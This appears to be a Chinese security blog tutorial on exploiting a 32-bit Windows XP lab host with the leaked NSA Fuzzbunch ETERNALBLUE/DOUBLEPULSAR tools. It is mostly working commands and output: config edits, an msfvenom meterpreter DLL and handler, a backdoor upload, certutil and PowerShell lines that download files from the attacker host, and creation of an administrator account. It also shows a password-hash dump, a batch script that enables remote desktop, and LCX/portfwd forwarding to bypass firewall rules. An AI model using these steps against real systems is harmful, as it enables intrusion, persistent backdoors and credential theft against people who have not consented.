近期因为工控安全大赛的原因，遇到了32系统存在17-010用matesploit无法利用的缘故。

目前斗哥的`metasploit
v4.17.2-dev`只支持`win7x64`、`win2008x64`、`win8x64`这几种系统的Getshell方式。

本文记录斗哥在实际场景中遇到的问题，以及学到的一些关于后渗透的小技巧。

### 0x00 Download NSA工具包

[NSA黑客工具包Github下载地址](https://github.com/misterch0c/shadowbroker)

由于攻击脚本需要32的Python2.6环境支持，因为攻击者电脑还需如下两个环境：

[python-2.6.6.msi](https://www.python.org/download/releases/2.6.6/)

[pywin32-221.win32-py2.6.exe](https://nchc.dl.sourceforge.net/project/pywin32/pywin32/Build%20221/pywin32-221.win32-py2.6.exe)

### 0x01 修改NSA工具配置文件

斗哥的工具包路径是`D:\shadowbroker-master\windows`

 **i. 修改`D:\shadowbroker-master\windows\fb.py`文件**

注释掉第72行代码`#addplugins(fb, "ListeningPost", LP_DIR, EDFPlugin)`

    
    
    def load_plugins(fb):
        fb.io.pre_input(None)
        fb.io.print_msg("Loading Plugins")
        fb.io.post_input()
        addplugins(fb, "Exploit",       EXPLOIT_DIR, EDFPlugin)
        addplugins(fb, "Payload",       PAYLOAD_DIR, EDFPlugin)
        addplugins(fb, "Touch",         TOUCH_DIR,   EDFPlugin)
        addplugins(fb, "ImplantConfig", IMPLANT_DIR, EDFPlugin)
        #addplugins(fb, "ListeningPost", LP_DIR,      EDFPlugin)
        addplugins(fb, "Special",       SPECIAL_DIR, DAVEPlugin, DeployableManager)
    

**ii. 修改`D:\shadowbroker-master\windows\Fuzzbunch.xml`文件**

修改第19行代码的`Resources`路径和第24行代码的`logs`路径，改成目前工具包存放的路径

    
    
    <t:parameter name="ResourcesDir"
                 description="Absolute path of the Resources Directory"
                 type="String"
                 default="D:\shadowbroker-master\windows\Resources"/>
    
    <t:parameter name="LogDir"
                 description="Absolute path of an Initial Log Directory"
                 type="String"
                 default="D:\shadowbroker-master\windows\logs"/>
    

### 0x03 运行fb.py脚本实施ETERNALBLUE攻击

#### 1\. 这里攻击的环境及IP地址如下：

 **攻击者IP 10.10.10.1**

Windows 10，安装了kali子系统，并且在子系统上安装了`metasploit v4.17`。

 **靶机IP 10.10.10.130**

32位 Windows XP

#### 2\. 运行`fb.py`文件实施`Eternalblue`攻击

运行`D:\shadowbroker-master\windows\fb.py`文件

    
    
    # python26 fb.py
    
    --[ Version 3.5.1
    
    [*] Loading Plugins
    [*] Initializing Fuzzbunch v3.5.1
    [*] Adding Global Variables
    [+] Set ResourcesDir => D:\shadowbroker-master\windows\Resources
    [+] Set Color => True
    [+] Set ShowHiddenParameters => False
    [+] Set NetworkTimeout => 60
    [+] Set LogDir => D:\shadowbroker-master\windows\logs
    [*] Autorun ON
    
    ...
    
    [?] Default Target IP Address [] : 10.10.10.130
    [?] Default Callback IP Address [] : 10.10.10.1
    [?] Use Redirection [yes] : no
    

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824155324298.png)

中间一些配置项，选择默认，这个过程确认下配置无误即可。

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824155552197.png)

中间一些配置项，选择默认，这个过程确认下配置无误即可。

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-2018082415584008.png)

#### 3\. msf监听后门dll文件

用kali生成一个用于回连的dll文件，由于斗哥攻击者PC是win10带有kali子系统，所以`lhost`仍然是`10.10.10.1`，生成`x86bind.dll`文件后，将其复制到D盘根路径下。

    
    
    msfvenom -p windows/meterpreter/bind_tcp lhost=10.10.10.1 lport=4444 -f dll -o x86bind.dll
    

**进入msfconsole设置监听**

    
    
    use exploit/multi/handler
    set payload  windows/meterpreter_reverse_tcp
    set lhost 10.10.10.1
    exploit
    

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-2018082416135515.png)

#### 4\. doublepulsar传入dll木马，获得shell

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824161850687.png)

中间一些配置项，选择默认，这个过程确认下配置无误即可。

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824162045958.png)

中间一些配置项，选择默认，这个过程确认下配置无误即可。

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824162143632.png)

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824165130788.png)

### 0x03 后渗透的一些利用

shell界面已经能做很多事情了，但很多时候需要获得更多权限，如得到服务器的远程桌面。

#### 1\. 上传上兴远控后门

最直接想传一个后门文件上去，方便自己管理。

 **`meterpreter`的`upload`功能**

    
    
    meterpreter > upload -h
    Usage: upload [options] src1 src2 src3 ... destination
    
    Uploads local files and directories to the remote machine.
    
    OPTIONS:
    
        -h        Help banner
        -r        Upload recursively
    
    
    
    meterpreter > upload /mnt/d/Sx_server.exe C:\
    >
    [*] uploading  : /mnt/d/Sx_server.exe -> C:
    [*] uploaded   : /mnt/d/Sx_server.exe -> C:\Sx_server.exe
    

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180824165852337.png)

**certutil.exe 文件下载功能** certutil本来是用来证书管理的，但是我们可以用它来下载文件。支持`xp-win10`，更多操作说明见<https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx>

下载语法：

    
    
    certutil.exe -urlcache -split -f [URL] output.file
    

实际测试过:

win2K3，比如下载一个`3389.bat`，先成一个缓存文件`Blob0_0.bin`，在把这个文件重命名为`3389.bat`。

    
    
    certutil.exe -urlcache -split -f http://10.10.10.1/3389.bat
    rename Blob0_0.bin 3389.bat
    

win7及以上系统：

    
    
    certutil.exe -urlcache -split -f http://10.10.10.1/3389.bat 3389.bat
    

另外如果是win7以上系统，就不得不提到powershell了。

    
    
    powershell (New-Object net.webclient).DownloadFile('http://10.10.10.1/3389.bat','c:\\3388.bat')"
    

#### 2\. 传3389.bat开3389，建账号。

得到账号可以创建一个账号然后将其加入管理员组：

    
    
    net user reborn 123456 /add && net localgroup administrators reborn /add
    

或者hashdump，然后破解密码

    
    
    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:20ac9ba0dd7f155c324c6ed1e021205b:38316494a911622d58a3e45b33bea9ce:::
    

**开3389端口**

`3389.bat`

    
    
    echo Windows Registry Editor Version 5.00>>3389.reg
    echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg
    echo "fDenyTSConnections"=dword:00000000>>3389.reg
    echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg
    echo "PortNumber"=dword:00000d3d>>3389.reg
    echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg
    echo "PortNumber"=dword:00000d3d>>3389.reg
    regedit /s 3389.reg
    del 3389.reg
    

或者一条命令

    
    
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    

#### 3\. 端口转发

meterpreter自带一个神器portfwd。

    
    
    Stdapi: Networking Commands
    ===========================
    
        Command       Description
        -------       -----------        portfwd       Forward a local port to a remote service
    

**端口转发 靶机3389端口转发送本地的5555端口**

    
    
    portfwd add -l 5555 -p 3389 -r 127.0.0.1
    

**攻击者连接本地127.0.0.1的5555端口，kali的rdesktop远程连接**

    
    
    rdesktop -u root -p toor 127.0.0.1:5555
    

LCX端口转发绕过防火墙入站规则:

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180821004426347.png)

受害者执行如下命令

    
    
    lcx.exe -slave 10.10.10.1 <攻击者端口，如5115> 10.10.10.254 <受害者端口，如3389>
    

攻击者执行如下命令：监听5115端口并转发到33891上

    
    
    lcx.exe -listen 5115 33891
    

攻击者远程连接：127.0.0.1:33891

LCX端口实现内网连接:

 **配置方式**

    
    
    内网服务器当成上述场景受害者ip
    公网服务器当成上述场景攻击者ip
    

![](http://pco19onyx.bkt.clouddn.com/markdown-img-paste-20180821011419443.png)

### 0x04 小结

实战的情况往往要比自己在虚拟机做实验要复杂得多，有时一个网络问题就会困恼自己很久，要考虑到转发和代理之类的，还是需要多动手实践才行。如果你看了我的文章有任何疑惑和不同的见解，非常欢迎你来和我交流，我的163邮箱：reborn54119@163.com。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180911/1536649424_5b9768d04f7c5.jpg!small)

